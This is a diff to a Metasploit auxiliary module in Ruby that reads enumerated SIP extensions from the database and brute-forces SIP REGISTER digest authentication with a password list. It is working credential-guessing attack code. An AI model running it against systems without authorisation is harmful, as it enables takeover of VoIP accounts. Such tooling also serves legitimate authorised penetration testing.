@@ -67,111 +67,117 @@ class MetasploitModule < Msf::Auxiliary
   
     # Fetch enumerated SIP users from the Metasploit database notes
     def fetch_enumerated_users(ip)
-      users = []
-      return users unless datastore['DB_ALL_NOTES_EXTENSIONS']
-  
-      framework.db.workspace.notes.each do |note|
-        # Extract the SIP extension from the note's data or ntype field
-        if note.data.to_s =~ /Found user: (\d+) <sip:\d+@#{ip}> \[Auth\]/ || note.ntype.to_s =~ /Found user: (\d+) <sip:\d+@#{ip}> \[Auth\]/
-          users << $1
+        users = []
+        return users unless datastore['DB_ALL_NOTES_EXTENSIONS']
+      
+        # Iterate over all notes in the workspace
+        framework.db.workspace.notes.each do |note|
+            
+          # Check if the note is for the target IP and contains SIP user information
+          if note.data.to_s.include?(ip) || note.ntype.to_s.include?(ip)
+            # Extract the SIP user using a regex that supports both formats
+            if note.data.to_s =~ /Found user: (\d+) <sip:\d+@#{ip}> \[Auth\]/ || note.ntype.to_s =~ /Found user: (\d+) <sip:\d+@#{ip}> \[Auth\]/
+              users << $1
+            end
+          end
         end
+      
+        users.uniq
       end
-      users.uniq
-    end
-  
     # Operate on a single system at a time
     def run_host(ip)
-      begin
-        meth = "REGISTER"
-        # Fetch enumerated users from the database notes
-        users = fetch_enumerated_users(ip)
-        if users.empty?
-          print_error("No enumerated SIP users found in the database for #{ip}.")
-          return
-        end
-  
-        print_status("Found #{users.length} enumerated SIP users for #{ip}: #{users.join(', ')}")
-  
-        # Load passwords from PASS_FILE
-        pass_file = File.expand_path(datastore['PASS_FILE'])
-        unless File.exist?(pass_file)
-          print_error("Password file not found: #{pass_file}")
-          return
-        end
-  
-        passwords = File.readlines(pass_file).map(&:chomp)
-        if passwords.empty?
-          print_error("No passwords found in the password file: #{pass_file}")
-          return
-        end
-  
-        print_status("Loaded #{passwords.length} passwords from #{pass_file}")
-  
-        # Try each password on a new user
-        passwords.each do |pass|
-          users.each do |user|
-            print_status("Testing: #{user}:#{pass}")
-  
-            # Create an unbound UDP socket if no CHOST is specified, otherwise
-            # create a UDP socket bound to CHOST (in order to avail of pivoting)
-            udp_sock = Rex::Socket::Udp.create(
-              {
-                'LocalHost' => datastore['CHOST'] || nil,
-                'LocalPort' => datastore['CPORT'].to_i,
-                'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
-              }
-            )
-            add_socket(udp_sock)
-  
-            # Initial REGISTER request
-            data = create_probe(ip, user, meth)
-            begin
-              udp_sock.sendto(data, ip, rport, 0)
-            rescue ::Interrupt
-              raise $!
-            rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused
-              print_error("Failed to send REGISTER request to #{ip}:#{rport}.")
-              next
-            end
-  
-            # Get SIP digest challenge, resolve and send it
-            res = udp_sock.recvfrom(65535, 1.0) # Increase timeout to 1 second
-            if res && res[0] && !res[0].empty?
-              data = resolve_challenge(res, meth, user, pass)
-              if data
-                begin
-                  udp_sock.sendto(data, ip, rport, 0)
-                rescue ::Interrupt
-                  raise $!
-                rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused
-                  print_error("Failed to send challenge response to #{ip}:#{rport}.")
+        udp_sock = nil  # Initialize udp_sock to nil
+        begin
+          meth = "REGISTER"
+          # Fetch enumerated users from the database notes
+          users = fetch_enumerated_users(ip)
+          if users.empty?
+            print_error("No enumerated SIP users found in the database for #{ip}.")
+            return
+          end
+      
+          print_status("Found #{users.length} enumerated SIP users for #{ip}: #{users.join(', ')}")
+      
+          # Load passwords from PASS_FILE
+          pass_file = File.expand_path(datastore['PASS_FILE'])
+          unless File.exist?(pass_file)
+            print_error("Password file not found: #{pass_file}")
+            return
+          end
+      
+          passwords = File.readlines(pass_file).map(&:chomp)
+          if passwords.empty?
+            print_error("No passwords found in the password file: #{pass_file}")
+            return
+          end
+      
+          print_status("Loaded #{passwords.length} passwords from #{pass_file}")
+      
+          # Try each password on a new user
+          passwords.each do |pass|
+            users.each do |user|
+              print_status("Testing: #{user}:#{pass}")
+      
+              # Create an unbound UDP socket if no CHOST is specified, otherwise
+              # create a UDP socket bound to CHOST (in order to avail of pivoting)
+              udp_sock = Rex::Socket::Udp.create(
+                {
+                  'LocalHost' => datastore['CHOST'] || nil,
+                  'LocalPort' => datastore['CPORT'].to_i,
+                  'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
+                }
+              )
+              add_socket(udp_sock)
+      
+              # Initial REGISTER request
+              data = create_probe(ip, user, meth)
+              begin
+                udp_sock.sendto(data, ip, rport, 0)
+              rescue ::Interrupt
+                raise $!
+              rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused
+                print_error("Failed to send REGISTER request to #{ip}:#{rport}.")
+                next
+              end
+      
+              # Get SIP digest challenge, resolve and send it
+              res = udp_sock.recvfrom(65535, 1.0) # Increase timeout to 1 second
+              if res && res[0] && !res[0].empty?
+                data = resolve_challenge(res, meth, user, pass)
+                if data
+                  begin
+                    udp_sock.sendto(data, ip, rport, 0)
+                  rescue ::Interrupt
+                    raise $!
+                  rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused
+                    print_error("Failed to send challenge response to #{ip}:#{rport}.")
+                    next
+                  end
+                else
+                  print_error("Failed to resolve challenge for user #{user}.")
                   next
                 end
               else
-                print_error("Failed to resolve challenge for user #{user}.")
+                print_error("No response received from the SIP server for user #{user}.")
                 next
               end
-            else
-              print_error("No response received from the SIP server for user #{user}.")
-              next
+      
+              # Receive and parse final response
+              res = udp_sock.recvfrom(65535, 1.0) # Increase timeout to 1 second
+              parse_reply(res, ip, user, pass)
+      
+              # Throttle requests to avoid blocking
+              sleep(datastore['THROTTLE'])
             end
-  
-            # Receive and parse final response
-            res = udp_sock.recvfrom(65535, 1.0) # Increase timeout to 1 second
-            parse_reply(res, ip, user, pass)
-  
-            # Throttle requests to avoid blocking
-            sleep(datastore['THROTTLE'])
           end
+        rescue ::Interrupt
+          raise $!
+        rescue ::Exception => e
+          print_error("Unknown error: #{e.class} #{e}")
+        ensure
+          udp_sock.close if udp_sock  # Only close udp_sock if it was initialized
         end
-      rescue ::Interrupt
-        raise $!
-      rescue ::Exception => e
-        print_error("Unknown error: #{e.class} #{e}")
-      ensure
-        udp_sock.close if udp_sock
       end
-    end
   
     # SIP requests creator
     def create_probe(ip, toext, meth)
